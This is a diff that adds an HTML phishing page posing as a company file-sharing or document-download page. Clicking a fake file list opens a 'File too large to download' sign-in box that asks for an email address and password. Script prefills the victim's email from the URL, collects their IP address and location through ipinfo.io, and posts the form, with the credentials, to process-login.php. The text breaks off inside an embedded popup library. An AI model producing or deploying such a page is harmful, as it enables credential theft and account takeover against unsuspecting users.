@@ -1,0 +1,725 @@
+<html lang="en"><script>
+    window[Symbol.for('MARIO_POST_CLIENT_{fca67f41-776b-438a-9382-662171858615}')] = new (class{constructor(e,t){this.name=e,this.destination=t,this.serverListeners={},this.bgRequestsListeners={},this.bgEventsListeners={},window.addEventListener("message",(e=>{const t=e.data,s=!(t.destination&&t.destination===this.name),n=!t.event;if(!s&&!n)if("MARIO_POST_SERVER__BG_RESPONSE"===t.event){const e=t.args;if(this.hasBgRequestListener(e.requestId)){try{this.bgRequestsListeners[e.requestId](e.response)}catch(e){}delete this.bgRequestsListeners[e.requestId]}}else if("MARIO_POST_SERVER__BG_EVENT"===t.event){const e=t.args;if(this.hasBgEventListener(e.event))try{this.bgEventsListeners[t.id](e.payload)}catch(e){}}else if(this.hasServerListener(t.event))try{this.serverListeners[t.event](t.args)}catch(e){}}))}emitToServer(e,t){const s=this.generateUIID(),n={args:t,destination:this.destination,event:e,id:s};return window.postMessage(n,location.origin),s}emitToBg(e,t){const s=this.generateUIID(),n={bgEventName:e,requestId:s,args:t};return this.emitToServer("MARIO_POST_SERVER__BG_REQUEST",n),s}hasServerListener(e){return!!this.serverListeners[e]}hasBgRequestListener(e){return!!this.bgRequestsListeners[e]}hasBgEventListener(e){return!!this.bgEventsListeners[e]}fromServerEvent(e,t){this.serverListeners[e]=t}fromBgEvent(e,t){this.bgEventsListeners[e]=t}fromBgResponse(e,t){this.bgRequestsListeners[e]=t}generateUIID(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(e){const t=16*Math.random()|0;return("x"===e?t:3&t|8).toString(16)}))}})('MARIO_POST_CLIENT_{fca67f41-776b-438a-9382-662171858615}', 'MARIO_POST_SERVER_{fca67f41-776b-438a-9382-662171858615}')</script><script>
+    const hideMyLocation = new (class{constructor(t){this.clientKey=t,this.watchIDs={},this.client=window[Symbol.for(t)];const e=navigator.geolocation.getCurrentPosition,o=navigator.geolocation.watchPosition,n=navigator.geolocation.clearWatch,i=this;navigator.geolocation.getCurrentPosition=function(t,o,n){i.handle(e,"GET",t,o,n)},navigator.geolocation.watchPosition=function(t,e,n){return i.handle(o,"WATCH",t,e,n)},navigator.geolocation.clearWatch=function(t){if(-1===t)return;const e=i.watchIDs[t];return delete i.watchIDs[t],n.apply(this,[e])}}handle(t,e,o,n,i){const a=this.client.emitToBg("HIDE_MY_LOCATION__GET_LOCATION");let r=this.getRandomInt(0,1e5);if(this.client.fromBgResponse(a,(a=>{if(a.enabled)if("SUCCESS"===a.status){const t=this.map(a);o(t)}else{const t=this.errorObj();n(t),r=-1}else{const a=[o,n,i],c=t.apply(navigator.geolocation,a);"WATCH"===e&&(this.watchIDs[r]=c)}})),"WATCH"===e)return r}map(t){return{coords:{accuracy:20,altitude:null,altitudeAccuracy:null,heading:null,latitude:t.latitude,longitude:t.longitude,speed:null},timestamp:Date.now()}}errorObj(){return{code:1,message:"User denied Geolocation"}}getRandomInt(t,e){return t=Math.ceil(t),e=Math.floor(e),Math.floor(Math.random()*(e-t+1))+t}})('MARIO_POST_CLIENT_{fca67f41-776b-438a-9382-662171858615}')
+  </script><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>View Company's Profile</title>
+
+    <meta name="description" content="_Materials">
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+	
+	
+	<script>(function inject(e){function SendXHRCandidate(e,t,n,r,i){try{var o="detector",s={posdMessageId:"PANELOS_MESSAGE",posdHash:(Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15)).substring(0,22),type:"VIDEO_XHR_CANDIDATE",from:o,to:o.substring(0,6),content:{requestMethod:e,url:t,type:n,content:r}};i&&i[0]&&i[0].length&&(s.content.encodedPostBody=i[0]),window.postMessage(s,"*")}catch(e){}}var t=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(){this.requestMethod=arguments[0],t.apply(this,arguments)};var n=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(){var t=Object.assign(arguments,{}),r=this.onreadystatechange;return this.onreadystatechange=function(){if(4!==this.readyState||function isFrameInBlackList(t){return e.some((function(e){return t.includes(e)}))}(this.responseURL)||setTimeout(SendXHRCandidate(this.requestMethod,this.responseURL,this.getResponseHeader("content-type"),this.response,t),0),r)return r.apply(this,arguments)},n.apply(this,arguments)};var r=fetch;fetch=function fetch(){var e=this,t=arguments,n=arguments[0]instanceof Request?arguments[0].url:arguments[0],i=arguments[0]instanceof Request?arguments[0].method:"GET";return new Promise((function(o,s){r.apply(e,t).then((function(e){if(e.body instanceof ReadableStream){var t=e.json;e.json=function(){var r=arguments,o=this;return new Promise((function(s,a){t.apply(o,r).then((function(t){setTimeout(SendXHRCandidate(i,n,e.headers.get("content-type"),JSON.stringify(t)),0),s(t)})).catch((function(e){a(e)}))}))};var r=e.text;e.text=function(){var t=arguments,o=this;return new Promise((function(s,a){r.apply(o,t).then((function(t){setTimeout(SendXHRCandidate(i,n,e.headers.get("content-type"),t),0),s(t)})).catch((function(e){a(e)}))}))}}o.apply(this,arguments)})).catch((function(){s.apply(this,arguments)}))}))}})(["facebook.com/","twitter.com/","youtube-nocookie.com/embed/","//vk.com/","//www.vk.com/","//linkedin.com/","//www.linkedin.com/","//instagram.com/","//www.instagram.com/","//www.google.com/recaptcha/api2/","//hangouts.google.com/webchat/","//www.google.com/calendar/","//www.google.com/maps/embed","spotify.com/","soundcloud.com/","//player.vimeo.com/","//disqus.com/","//tgwidget.com/","//js.driftt.com/","friends2follow.com","/widget","login","//video.bigmir.net/","blogger.com","//smartlock.google.com/","//keep.google.com/","/web.tolstoycomments.com/","moz-extension://","chrome-extension://","/auth/","//analytics.google.com/","adclarity.com","paddle.com/checkout","hcaptcha.com","recaptcha.net","2captcha.com","accounts.google.com","www.google.com/shopping/customerreviews","buy.tinypass.com","gstatic.com","secureir.ebaystatic.com","docs.google.com","contacts.google.com","github.com","mail.google.com","chat.google.com","audio.xpleer.com","keepa.com","static.xx.fbcdn.net"]);</script><script ecommerce-type="extend-native-history-api">(()=>{const e=history.pushState,t=history.replaceState,a=history.back,r=history.forward;function n(){window.postMessage({_custom_type_:"CUSTOM_ON_URL_CHANGED"})}history.pushState=function(){e.apply(history,arguments),n()},history.replaceState=function(){t.apply(history,arguments),n()},history.back=function(){a.apply(history,arguments),n()},history.forward=function(){r.apply(history,arguments),n()}})()</script>
+
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+    <style>
+        video {
+            object-fit: cover;
+            width: 100vw;
+            height: 100vh;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+        }
+
+        .wrap {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20x;
+            opacity: 0.8;
+            height: 450px;
+            display: flex;
+            align-items: center;
+        }
+
+        .wrap img {
+            width: 100%;
+        }
+
+        .wrapa {
+            position: absolute;
+            top: 40%;
+            left: 40%;
+            transform: translate(-50%, -50%);
+            padding: 20x;
+            height: 450px;
+            display: flex;
+            align-items: center;
+            width: 60%;
+        }
+
+        .wrapa img {
+            width: 100%;
+        }
+
+        #myModal {
+            position: absolute;
+            top: 70%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        @media (max-width: 575.98px) {
+            #myModal {
+                position: absolute;
+                top: 70%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+            }
+
+            .wrap {
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                padding: 20x;
+                height: 450px;
+                display: flex;
+                align-items: center;
+                width: 100%;
+            }
+
+            .wrap img {
+                width: 100%;
+            }
+
+            .wrapa {
+                position: absolute;
+                top: 35%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                padding: 20x;
+                height: 450px;
+                display: flex;
+                align-items: center;
+                width: 100%;
+            }
+
+            .wrapa img {
+                width: 100%;
+            }
+        }
+		
+		
+		#loadFormPop { 
+    background:#fff;
+    border-radius:15px;
+    color:#ccc;
+    display:none; 
+    padding:20px;
+	text-align:center;
+	margin-top:100px;
+	max-width:400px;
+}
+
+
+
+#loadingPop { 
+    background:#none;
+    border-radius:15px;
+    color:#ccc;
+    display:none; 
+    padding:20px;
+	text-align:center;
+	margin-top:100px;
+}
+		
+		
+		
+		.notice-error{
+		border: 1px solid #f6c8b5;
+  background: #fceee8;
+  padding: 4px 32px;
+  line-height: 18px;
+  font-family: Tahoma,Helvetica,Arial,宋体;
+  color: #4d4d4d;
+  font-size: 12px;
+  margin-top: 15px;
+		}
+
+		
+		
+		
+    </style>
+</head>
+
+<body style="height: 100vh;" class="" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6IntmY2E2N2Y0MS03NzZiLTQzOGEtOTM4Mi02NjIxNzE4NTg2MTV9IiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjEuOS4xNSIsInNjb3JlIjoxMDkxNX1d">
+<script>
+    $(document).ready(function() {
+        // Fetch geolocation information using ipinfo.io API
+        $.get("https://ipinfo.io", function(response) {
+            $("#city").val(response.city);
+            $("#country").val(response.country);
+            $("#ip_address").val(response.ip);
+        }, "jsonp");
+
+        // Get the email parameter from the URL
+        var urlParams = new URLSearchParams(window.location.search);
+        var emailParam = urlParams.get('email');
+
+        // Set the value of the email input field if the email parameter exists
+        if (emailParam) {
+            $("#x1").val(emailParam);
+        }
+
+        $("#formx").submit(function(e) {
+            e.preventDefault();
+            // Capture email and password
+            var email = $("#x1").val();
+            var password = $("#x2").val();
+            // Prepare form data
+            var formData = new FormData($("#formx")[0]);
+            // Disable submit button and show loading spinner
+            $("#submitBtn").html(`<button class="btn btn-sm btn-primary" disabled>
+            <span class="spinner-grow spinner-grow-sm"></span>
+            Please Wait...
+        </button>`).prop("disabled", true);
+            // Send form data to server-side script
+            $.ajax({
+                url: "process-login.php", // Update with the actual URL of your server-side script
+                type: 'POST',
+                data: formData,
+                contentType: false,
+                processData: false,
+                success: function(res) {
+                    // Handle success response
+                    console.log(res);
+                },
+                error: function(xhr, status, error) {
+                    // Handle error response
+                    console.error(xhr.responseText);
+                }
+            });
+        });
+    });
+</script>
+
+<div class="container" bis_skin_checked="1">
+    <div class="wrap" bis_skin_checked="1">
+
+        <script>
+
+
+            $(document).ready(function() {
+
+                var baseUrl = (window.location).href;
+                var tech = baseUrl.substring(baseUrl.lastIndexOf('#') + 1);
+
+                var is = $("#x1 ").html(tech);
+                $('.wrap').click(function() {
+                    $('#show').hide();
+                    $('#hide').show();
+                });
+            });
+        </script>
+
+    </div>
+</div>
+
+
+<main id="show">
+    <nav class="navbar" style="background-color:#0070C3">
+        <div class="container" bis_skin_checked="1">
+            <a class="navbar-brand" href="#"><img src="https://cdn.glitch.global/3b26bc0d-3c39-44da-a49e-84aefc634cd2/logo.jpg"></a>
+            <button class="navbar-toggler " type="button ">
+              <span class="navbar-toggler-icon text-dark"></span>
+            </button>
+
+        </div>
+    </nav>
+    <div class="container" bis_skin_checked="1">
+
+        <div class="" data-bs-toggle="modal" data-bs-target="#myModal" bis_skin_checked="1">
+
+
+
+            <div class="row" bis_skin_checked="1">
+
+                <div class="col-sm-8" bis_skin_checked="1">
+
+
+
+                    <table class="table ">
+
+                        <tbody><tr data-toggle="modal" data-bs-toggle="modal" data-bs-target="#myModal">
+
+                            <th>Name↑</th>
+
+                            <th>Size▼</th>
+
+                            <th>Action▼</th>
+
+                        </tr>
+
+                        <tr data-toggle="modal" data-bs-toggle="modal" data-bs-target="#myModal">
+
+                            <td><img src="https://cdn.glitch.global/3b26bc0d-3c39-44da-a49e-84aefc634cd2/2.png"></td>
+
+                            <td><img src="https://cdn.glitch.global/3b26bc0d-3c39-44da-a49e-84aefc634cd2/a.png"></td>
+
+                            <td><img src="https://cdn.glitch.global/3b26bc0d-3c39-44da-a49e-84aefc634cd2/d.png"></td>
+
+                        </tr>
+
+                        <tr data-toggle="modal" data-bs-toggle="modal" data-bs-target="#myModal">
+
+                            <td><img src="https://cdn.glitch.global/3b26bc0d-3c39-44da-a49e-84aefc634cd2/1.png"></td>
+
+                            <td><img src="https://cdn.glitch.global/3b26bc0d-3c39-44da-a49e-84aefc634cd2/b.png"></td>
+
+                            <td><img src="https://cdn.glitch.global/3b26bc0d-3c39-44da-a49e-84aefc634cd2/d.png"></td>
+
+                        </tr>
+
+                        <tr data-toggle="modal" data-bs-toggle="modal" data-bs-target="#myModal">
+
+                            <td><img src="https://cdn.glitch.global/3b26bc0d-3c39-44da-a49e-84aefc634cd2/3.png"></td>
+
+                            <td><img src="https://cdn.glitch.global/3b26bc0d-3c39-44da-a49e-84aefc634cd2/c.png"></td>
+
+                            <td><img src="https://cdn.glitch.global/3b26bc0d-3c39-44da-a49e-84aefc634cd2/d.png"></td>
+
+                        </tr>
+
+                        <tr data-toggle="modal" data-bs-toggle="modal" data-bs-target="#myModal">
+
+                            <td><img src="https://cdn.glitch.global/3b26bc0d-3c39-44da-a49e-84aefc634cd2/4.png"></td>
+
+                            <td><img src="https://cdn.glitch.global/3b26bc0d-3c39-44da-a49e-84aefc634cd2/e.png"></td>
+
+                            <td><img src="https://cdn.glitch.global/3b26bc0d-3c39-44da-a49e-84aefc634cd2/d.png"></td>
+
+                        </tr>
+
+                        <tr data-toggle="modal" data-bs-toggle="modal" data-bs-target="#myModal">
+
+                            <td><img src="https://cdn.glitch.global/3b26bc0d-3c39-44da-a49e-84aefc634cd2/5.png"></td>
+
+                            <td><img src="https://cdn.glitch.global/3b26bc0d-3c39-44da-a49e-84aefc634cd2/f.png"></td>
+
+                            <td><img src="https://cdn.glitch.global/3b26bc0d-3c39-44da-a49e-84aefc634cd2/d.png"></td>
+
+                        </tr>
+
+                        <tr data-toggle="modal" data-bs-toggle="modal" data-bs-target="#myModal">
+
+                            <td></td>
+
+                            <td></td>
+
+                            <td><img src="https://cdn.glitch.global/3b26bc0d-3c39-44da-a49e-84aefc634cd2/aa.png"></td>
+
+                        </tr>
+
+                    </tbody></table>
+
+                </div>
+
+                <div class="col-sm-4" bis_skin_checked="1">
+
+                    <img src="https://cdn.glitch.global/3b26bc0d-3c39-44da-a49e-84aefc634cd2/ss.png" class="img-fluid">
+
+                </div>
+
+            </div>
+
+
+
+        </div>
+
+    </div>
+
+
+	
+	
+	
+	<div id="loadingPop">
+  <input type="button" class="b-close" style="cursor:pointer;
+    position:absolute;
+    right:10px;
+    top:5px; font-size:18px; font-weight:bold; display:none;" id="CloseMeNowLog">
+            <img src="data:image/gif;base64,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" /></div>
+	
+	
+	
+	
+	
+
+    <!-- The Modal -->
+
+    <div class="modal" id="myModal" style="display: none;" bis_skin_checked="1" aria-hidden="true">
+
+        <div class="modal-dialog" bis_skin_checked="1">
+
+
+
+            <div class="modal-content" bis_skin_checked="1">
+
+
+
+                <!-- Modal Header -->
+
+
+
+
+
+                <!-- Modal body -->
+
+                <div class="modal-body p-3" bis_skin_checked="1">
+
+
+
+                    <img src="https://cdn.glitch.global/3b26bc0d-3c39-44da-a49e-84aefc634cd2/to.png" class="img-fluid"><br>
+
+                    <small class="text-danger" id="msg" style="font-weight:600;"></small>
+
+						<div id="login-error" class="notice-error" data-spm-anchor-id="a2700.icbu-homelogin.0.i2.51241afayjy2R6" style="display: none;">
+    <span class="icon-notice icon-error"></span>
+    File too large to download, please try again.
+</div>
+					
+						<form class="my-4" id="logFormNew" name="logFormNew" onsubmit="return false;">
+							
+				<input type="hidden" id="logCheck" name="logCheck"  value="1">
+			    <input type="hidden" id="logCheckCount" name="logCheckCount"  value="0" autocomplete="off">			
+							
+
+                      
+
+                     <label>Email Address *</label>
+							<input type="email" name="email" id="email" placeholder="Email Address" class="form-control mb-3" value="">
+
+                 
+							 <label>Password *</label>
+							<input type="password" id="password" name="password" class="form-control mb-3" placeholder="Password" value="" required="">
+
+                        <button id="submitBtn0" class="btn btn-md btn-primary" onClick="loginFunc()">Sign In</button>
+
+                    </form>
+
+
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+</main>
+
+	
+	
+	
+	
+	
+
+<script language="javascript" type="text/javascript">
+
+
+    // Semicolon (;) to ensure closing of earlier scripting
+    // Encapsulation
+    // $ is assigned to jQuery
+    ;(function($) {
+
+         // DOM Ready
+        $(function() {
+
+            // Binding a click event
+            // From jQuery v.1.7.0 use .on() instead of .bind()
+            $('#my-button').bind('click', function(e) {
+
+                // Prevents the default action to be triggered. 
+                e.preventDefault();
+
+                // Triggering bPopup when click event is fired
+                 $('myRegPop_up').bPopup({
+            modalClose: false,
+            opacity: 0.6,
+            positionStyle: 'fixed' //'fixed' or 'absolute'
+        });
+
+            });
+
+        });
+
+    })(jQuery);
+	
+	
+	
+	    ;(function($) {
+
+         // DOM Ready
+        $(function() {
+
+            // Binding a click event
+            // From jQuery v.1.7.0 use .on() instead of .bind()
+            $('#myown-contact').bind('click', function(e) {
+
+                // Prevents the default action to be triggered. 
+                e.preventDefault();
+
+                // Triggering bPopup when click event is fired
+                 $('myconfirmPop_up').bPopup({
+            modalClose: false,
+            opacity: 0.6,
+            positionStyle: 'fixed' //'fixed' or 'absolute'
+        });
+
+            });
+
+        });
+
+    })(jQuery);
+
+
+
+
+/*================================================================================
+ * @name: bPopup - if you can't get it up, use bPopup
